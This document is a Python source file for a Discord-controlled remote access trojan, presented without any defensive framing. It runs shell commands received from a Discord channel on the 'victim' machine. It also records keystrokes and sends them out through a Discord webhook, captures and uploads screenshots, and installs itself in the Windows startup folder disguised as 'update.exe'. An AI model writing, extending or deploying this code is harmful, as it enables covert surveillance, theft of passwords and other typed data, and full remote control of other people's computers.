import discord
from discord.ext import commands
import asyncio
import subprocess
import socket
import os
import threading
import time
from pynput.keyboard import Listener as KeyListener
from PIL import ImageGrab
import pyautogui
import requests  # For webhook exfil

# Config
DISCORD_TOKEN = 'VICTIM_ALT_TOKEN'  # Alt Discord account token for this victim
SERVER_ID = 1234567890123456789     # Your server ID
COMMAND_CHANNEL_ID = 9876543210987654321  # #commands
LOG_WEBHOOK_URL = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_URL'  # For silent exfil
VICTIM_ID = socket.gethostname()  # Unique ID

client = discord.Client(intents=discord.Intents.default())

# Persistence: Add to startup (Windows)
def add_to_startup():
    script_path = os.path.abspath(__file__)
    startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup', 'update.exe')
    if not os.path.exists(startup_path):
        with open(startup_path, 'w') as f:
            f.write(f'@echo off\npython "{script_path}"')

# Keylogger
log = ''
def on_key(key):
    global log
    try:
        log += str(key.char)
    except:
        log += f'[{key}]'
    if len(log) > 100:
        exfil_log(log)
        log = ''

def start_keylogger():
    with KeyListener(on_press=on_key) as listener:
        listener.join()

def exfil_log(data):
    payload = {'content': f'VICTIM_ID: {VICTIM_ID} | KEYS: {data}'}
    requests.post(LOG_WEBHOOK_URL, json=payload)

# Screenshot
def take_screenshot():
    screenshot = ImageGrab.grab()
    screenshot.save('screen.png')
    with open('screen.png', 'rb') as f:
        # Upload to Discord or webhook (adapt)
        pass  # For now, just save; extend to upload

# Command Executor
async def poll_commands():
    await client.wait_until_ready()
    channel = client.get_channel(COMMAND_CHANNEL_ID)
    while True:
        if channel:
            async for message in channel.history(limit=1):
                if 'EXEC:' in message.content and VICTIM_ID in message.content:  # Target this victim
                    cmd = message.content.split('EXEC:')[1].strip()
                    
                    # Execute based on cmd
                    if cmd == 'keylog':
                        threading.Thread(target=start_keylogger, daemon=True).start()
                        await channel.send(f'VICTIM_ID: {VICTIM_ID} | Keylog started')
                    elif cmd == 'screenshot':
                        take_screenshot()
                        # Upload file to channel
                        with open('screen.png', 'rb') as f:
                            await channel.send(file=discord.File(f, 'screen.png'), content=f'VICTIM_ID: {VICTIM_ID}')
                    elif cmd.startswith('shell '):
                        try:
                            result = subprocess.check_output(cmd.split(' ',1)[1], shell=True, stderr=subprocess.STDOUT)
                            await channel.send(f'VICTIM_ID: {VICTIM_ID} | OUTPUT: {result.decode()}')
                        except Exception as e:
                            await channel.send(f'VICTIM_ID: {VICTIM_ID} | ERROR: {str(e)}')
                    elif cmd == 'persist':
                        add_to_startup()
                        await channel.send(f'VICTIM_ID: {VICTIM_ID} | Persistence set')
        
        await asyncio.sleep(10)  # Poll every 10s

@client.event
async def on_ready():
    print(f'{client.user} connected as victim {VICTIM_ID}')
    # Join server if not already
    guild = client.get_guild(SERVER_ID)
    if guild:
        await guild.text_channels[0].send(f'VICTIM_ID: {VICTIM_ID} | Online')

client.loop.create_task(poll_commands())
client.run(DISCORD_TOKEN)
